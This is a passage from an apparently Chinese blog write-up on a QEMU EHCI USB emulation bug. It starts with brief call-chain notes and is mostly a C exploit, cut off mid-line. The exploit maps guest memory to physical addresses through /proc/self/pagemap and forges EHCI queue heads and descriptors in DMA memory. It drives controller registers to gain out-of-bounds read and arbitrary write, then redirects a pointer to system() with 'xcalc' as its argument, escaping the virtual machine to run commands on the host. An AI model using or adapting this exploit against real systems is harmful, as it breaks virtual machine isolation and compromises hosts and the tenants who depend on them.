list!=0</p><p>get_dwords(ehci, list, &amp;entry, 1 &gt;=0<br>{<br>    (!ehci-&gt;as )=0<br>}</p><p>然后就可以执行到ehci_advance_state ，目标执行ehci_state_execute</p><p>约束<br>{<br>s-&gt;pstate==0x1011<br>}</p><p>又仔细看了下调用链，其实 usb的协议也不很了解，甚至于不用去查手册，很多选择都隐藏在一条利用链调用的约束条件<br>要不是看到文章写到这。我都忘了要分析调用链了，呜呜</p><p>为什么会有直接操作 mmio就能对某些内存进行修改呢，因为有个dma内存的映射</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dbg_printf(fmt, ...)\</span></span><br><span class="line"><span class="keyword">do</span> &#123;\</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"%s:%d(): "</span> fmt,__func__,__LINE__,##__VA_ARGS__);\</span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="number">0</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dbg_printf(fmt, ...)\</span></span><br><span class="line"><span class="keyword">do</span> &#123;\</span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="number">0</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">USBDevice</span> <span class="title">USBDevice</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">USBEndpoint</span> <span class="title">USBEndpoint</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  <span class="title">EHCIqtd</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> next;                    <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> altnext;                 <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> token;</span><br><span class="line">    <span class="keyword">uint32_t</span> bufptr[<span class="number">5</span>];               <span class="comment">/* Standard buffer pointer */</span></span><br><span class="line">&#125;EHCIqtd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  <span class="title">EHCIqh</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> next;                    <span class="comment">/* Standard next link pointer */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* endpoint characteristics */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> epchar;</span><br><span class="line">    <span class="keyword">uint32_t</span> epcap;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> current_qtd;             <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> next_qtd;                <span class="comment">/* Standard next link pointer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> altnext_qtd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> token;                   <span class="comment">/* Same as QTD token */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> bufptr[<span class="number">5</span>];               <span class="comment">/* Standard buffer pointer */</span></span><br><span class="line">&#125;EHCIqh;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBEndpoint</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> nr;</span><br><span class="line">    <span class="keyword">uint8_t</span> pid;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint8_t</span> ifnum;</span><br><span class="line">    <span class="keyword">int</span> max_packet_size;</span><br><span class="line">    <span class="keyword">int</span> max_streams;</span><br><span class="line">    <span class="keyword">bool</span> pipeline;</span><br><span class="line">    <span class="keyword">bool</span> halted;</span><br><span class="line">    USBDevice *dev;</span><br><span class="line">    USBEndpoint *fd;</span><br><span class="line">    USBEndpoint *bk;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBDevice</span> &#123;</span></span><br><span class="line">    <span class="keyword">int32_t</span> remote_wakeup;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_state;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_len;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_index;</span><br><span class="line"></span><br><span class="line">    USBEndpoint ep_ctl;</span><br><span class="line">    USBEndpoint ep_in[<span class="number">15</span>];</span><br><span class="line">    USBEndpoint ep_out[<span class="number">15</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> * mmio_mem;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> * mm_dma;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span>&#123;</span><br><span class="line">*((<span class="keyword">uint32_t</span>*)(mmio_mem+addr))=value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> mmio_read(<span class="keyword">uint32_t</span> addr)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> *((<span class="keyword">uint64_t</span> *)(mmio_mem+addr));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">uint64_t</span> page_offset(<span class="keyword">uint64_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gfn(<span class="keyword">void</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">"open pagemap"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gpa(<span class="keyword">void</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> virt2phys(<span class="keyword">void</span>* p)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> virt = (<span class="keyword">uint64_t</span>)p;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Assert page alignment</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"open"</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> offset = (virt / <span class="number">0x1000</span>) * <span class="number">8</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">uint64_t</span> phys;</span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;phys, <span class="number">8</span> ) != <span class="number">8</span>)</span><br><span class="line">        die(<span class="string">"read"</span>);</span><br><span class="line">    <span class="comment">// Assert page present</span></span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">    phys = (phys &amp; ((<span class="number">1U</span>LL &lt;&lt; <span class="number">54</span>) - <span class="number">1</span>)) * <span class="number">0x1000</span>+(virt&amp;<span class="number">0xfff</span>);</span><br><span class="line">    <span class="keyword">return</span> phys;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">void</span> *, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EHCIqtd</span> *<span class="title">qtd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EHCIqh</span> *<span class="title">qh</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EHCIQueue</span> *<span class="title">q</span>;</span></span><br><span class="line"><span class="keyword">uint32_t</span> *dma_buf32;</span><br><span class="line"><span class="keyword">char</span> *setup_buf1;</span><br><span class="line"><span class="keyword">char</span> *setup_buf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *tmp;</span><br><span class="line"><span class="keyword">uint64_t</span> *tmp1;</span><br><span class="line"><span class="keyword">uint64_t</span> dev_addr ;</span><br><span class="line"><span class="keyword">uint64_t</span> data_buf ;</span><br><span class="line"><span class="keyword">uint64_t</span> port ;</span><br><span class="line"><span class="keyword">uint64_t</span> leak_addr;</span><br><span class="line"><span class="keyword">uint64_t</span> irq_addr ;</span><br><span class="line"><span class="keyword">uint64_t</span> ehci_addr ;</span><br><span class="line"><span class="keyword">uint64_t</span> irq_point;</span><br><span class="line"><span class="keyword">uint64_t</span>    system_addr;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setlength</span><span class="params">(<span class="keyword">uint16_t</span> len,<span class="keyword">uint8_t</span> in)</span></span>&#123;</span><br><span class="line">mmio_write(<span class="number">0x64</span>,<span class="number">0x100</span>);</span><br><span class="line">mmio_write(<span class="number">0x64</span>,<span class="number">4</span>);</span><br><span class="line">qh-&gt;current_qtd=virt2phys(mm_dma+<span class="number">0x200</span>);</span><br><span class="line">setup_buf[<span class="number">0</span>]=in;</span><br><span class="line">setup_buf[<span class="number">6</span>]=len&amp;<span class="number">0xff</span>;</span><br><span class="line">setup_buf[<span class="number">7</span>]=(len&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">qh-&gt;epchar=<span class="number">0</span>;</span><br><span class="line">qh-&gt;token=<span class="number">1</span>&lt;&lt;<span class="number">7</span>;</span><br><span class="line">qh-&gt;next=virt2phys(mm_dma+<span class="number">0x100</span>)+<span class="number">0x2</span>;</span><br><span class="line">qtd-&gt;token=<span class="number">1</span>&lt;&lt;<span class="number">7</span>|<span class="number">2</span>&lt;&lt;<span class="number">8</span>|<span class="number">8</span>&lt;&lt;<span class="number">16</span>|<span class="number">1</span>&lt;&lt;<span class="number">6</span>;</span><br><span class="line">qtd-&gt;token=<span class="number">1</span>&lt;&lt;<span class="number">7</span>|<span class="number">2</span>&lt;&lt;<span class="number">8</span>|<span class="number">8</span>&lt;&lt;<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">qtd-&gt;bufptr[<span class="number">0</span>]=virt2phys(mm_dma+<span class="number">0x300</span>);</span><br><span class="line">dma_buf32[<span class="number">0</span>]=virt2phys(mm_dma+<span class="number">0x100</span>)+<span class="number">0x2</span>;</span><br><span class="line">mmio_write(<span class="number">0x28</span>,<span class="number">0</span>);</span><br><span class="line">mmio_write(<span class="number">0x30</span>,<span class="number">0</span>);</span><br><span class="line">mmio_write(<span class="number">0x34</span>,virt2phys(mm_dma));</span><br><span class="line">mmio_write(<span class="number">0x38</span>,virt2phys(mm_dma));</span><br><span class="line">mmio_write(<span class="number">0x2c</span>,<span class="number">0x4</span>);</span><br><span class="line">mmio_write(<span class="number">0x20</span>,<span class="number">0x11</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_copy_read</span><span class="params">()</span></span>&#123;</span><br><span class="line">mmio_write(<span class="number">0x64</span>,<span class="number">0x100</span>);</span><br><span class="line">mmio_write(<span class="number">0x64</span>,<span class="number">4</span>);</span><br><span class="line">qh-&gt;current_qtd=virt2phys(mm_dma+<span class="number">0x200</span>);</span><br><span class="line">qh-&gt;epchar=<span class="number">0</span>;</span><br><span class="line">qh-&gt;token=<span class="number">1</span>&lt;&lt;<span class="number">7</span>;</span><br><span class="line">qtd-&gt;token=<span class="number">1</span>&lt;&lt;<span class="number">7</span>|<span class="number">1</span>&lt;&lt;<span class="number">8</span>|<span class="number">0x1f00</span>&lt;&lt;<span class="number">16</span>;</span><br><span class="line">qh-&gt;next=virt2phys(mm_dma+<span class="number">0x100</span>)+<span class="number">0x2</span>;</span><br><span class="line">setup_buf1[<span class="number">0</span>]=<span class="number">0x80</span>;</span><br><span class="line">qtd-&gt;bufptr[<span class="number">0</span>]=virt2phys(mm_dma+<span class="number">0x1000</span>);</span><br><span class="line">qtd-&gt;bufptr[<span class="number">1</span>]=virt2phys(mm_dma+<span class="number">0x2000</span>);</span><br><span class="line">dma_buf32[<span class="number">0</span>]=virt2phys(mm_dma+<span class="number">0x100</span>)+<span class="number">0x2</span>;</span><br><span class="line">mmio_write(<span class="number">0x28</span>,<span class="number">0</span>);</span><br><span class="line">mmio_write(<span class="number">0x30</span>,<span class="number">0</span>);</span><br><span class="line">mmio_write(<span class="number">0x34</span>,virt2phys(mm_dma));</span><br><span class="line">mmio_write(<span class="number">0x38</span>,virt2phys(mm_dma));</span><br><span class="line">mmio_write(<span class="number">0x2c</span>,<span class="number">0x4</span>);</span><br><span class="line">mmio_write(<span class="number">0x20</span>,<span class="number">0x11</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">uint64_t</span> arb_write(<span class="keyword">uint64_t</span> des,<span class="keyword">uint64_t</span> src)&#123;</span><br><span class="line">setlength(<span class="number">0x2000</span>,<span class="number">0x40</span>);</span><br><span class="line">sleep(<span class="number">3</span>);</span><br><span class="line">*(<span class="keyword">uint32_t</span>*)(mm_dma+<span class="number">0x1000</span>+<span class="number">0x1000</span>+<span class="number">0x4</span>+<span class="number">0x8</span>)=<span class="number">-0x871b4</span><span class="number">-0x1e00</span>;</span><br><span class="line">*(<span class="keyword">uint32_t</span>*)(mm_dma+<span class="number">0x1000</span>+<span class="number">0x1000</span>+<span class="number">0x4</span>+<span class="number">0x4</span>)=<span class="number">-0x871b4</span>+<span class="number">8</span>;</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(mm_dma+<span class="number">0x1000</span>+<span class="number">0x28</span>+<span class="number">0x44</span>)=system_addr;</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(mm_dma+<span class="number">0x1000</span>+<span class="number">0x38</span>+<span class="number">0x44</span>)=<span class="number">0x3</span>;</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(mm_dma+<span class="number">0x1000</span>+<span class="number">0x30</span>+<span class="number">0x44</span>)=data_buf+<span class="number">0x44</span>+<span class="number">0x100</span>;</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(mm_dma+<span class="number">0x1000</span>+<span class="number">0x44</span>+<span class="number">0x100</span>)=<span class="number">0x636c616378</span>;</span><br><span class="line">mmio_write(<span class="number">0x64</span>,<span class="number">0x100</span>);</span><br><span class="line">mmio_write(<span class="number">0x64</span>,<span class="number">0x4</span>);</span><br><span class="line">qh-&gt;current_qtd=virt2phys(mm_dma+<span class="number">0x200</span>);</span><br><span class="line">qh-&gt;epchar=<span class="number">0</span>;</span><br><span class="line">qh-&gt;token=<span class="number">1</span>&lt;&lt;<span class="number">7</span>;</span><br><span class="line">qtd-&gt;token=<span class="number">1</span>&lt;&lt;<span class="number">7</span>|<span class="number">0</span>&lt;&lt;<span class="number">8</span>|<span class="number">0x1e00</span>&lt;&lt;<span class="number">16</span>;</span><br><span class="line">qh-&gt;next=virt2phys(mm_dma+<span class="number">0x100</span>)+<span class="number">0x2</span>;</span><br><span class="line">setup_buf1[<span class="number">0</span>]=<span class="number">0xe1</span>;</span><br><span class="line"></span><br><span class="line">qtd-&gt;bufptr[<span class="number">0</span>]=virt2phys(mm_dma+<span class="number">0x1000</span>);</span><br><span class="line">qtd-&gt;bufptr[<span class="number">1</span>]=virt2phys(mm_dma+<span class="number">0x2000</span>);</span><br><span class="line">dma_buf32[<span class="number">0</span>]=virt2phys(mm_dma+<span class="number">0x100</span>)+<span class="number">0x2</span>;</span><br><span class="line">mmio_write(<span class="number">0x28</span>,<span class="number">0</span>);</span><br><span class="line">mmio_write(<span class="number">0x30</span>,<span class="number">0</span>);</span><br><span class="line">mmio_write(<span class="number">0x34</span>,virt2phys(mm_dma));</span><br><span class="line">mmio_write(<span class="number">0x38</span>,virt2phys(mm_dma));</span><br><span class="line">mmio_write(<span class="number">0x2c</span>,<span class="number">0x4</span>);</span><br><span class="line">mmio_write(<span class="number">0x20</span>,<span class="number">0x11</span>);</span><br><span class="line">sleep(<span class="number">3</span>);</span><br><span class="line"><span class="comment">//////////////////////////////////////</span></span><br><span class="line">mmio_write(<span class="number">0x64</span>,<span class="number">0x100</span>);</span><br><span class="line">mmio_write(<span class="number">0x64</span>,<span class="number">0x4</span>);</span><br><span class="line">qh-&gt;current_qtd=virt2phys(mm_dma+<span class="number">0x200</span>);</span><br><span class="line">qh-&gt;epchar=<span class="number">0</span>;</span><br><span class="line">qh-&gt;token=<span class="number">1</span>&lt;&lt;<span class="number">7</span>;</span><br><span class="line">qtd-&gt;token=<span class="number">1</span>&lt;&lt;<span class="number">7</span>|<span class="number">0</span>&lt;&lt;<span class="number">8</span>|<span class="number">0x1e00</span>&lt;&lt;<span class="number">16</span>;</span><br><span class="line">qh-&gt;next=virt2phys(mm_dma+<span class="number">0x100</span>)+<span class="number">0x2</span>;</span><br><span class="line">setup_buf1[<span class="number">0</span>]=<span class="number">0xe1</span>;</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(mm_dma+<span class="number">0x1000</span>)=src;</span><br><span class="line">qtd-&gt;bufptr[<span class="number">0</span>]=virt2phys(mm_dma+<span class="number">0x1000</span>);</span><br><span class="line">qtd-&gt;bufptr[<span class="number">1</span>]=virt2phys(mm_dma+<span class="number">0x2000</span>);</span><br><span class="line">dma_buf32[<span class="number">0</span>]=virt2phys(mm_dma+<span class="number">0x100</span>)+<span class="number">0x2</span>;</span><br><span class="line">mmio_write(<span class="number">0x28</span>,<span class="number">0</span>);</span><br><span class="line">mmio_write(<span class="number">0x30</span>,<span 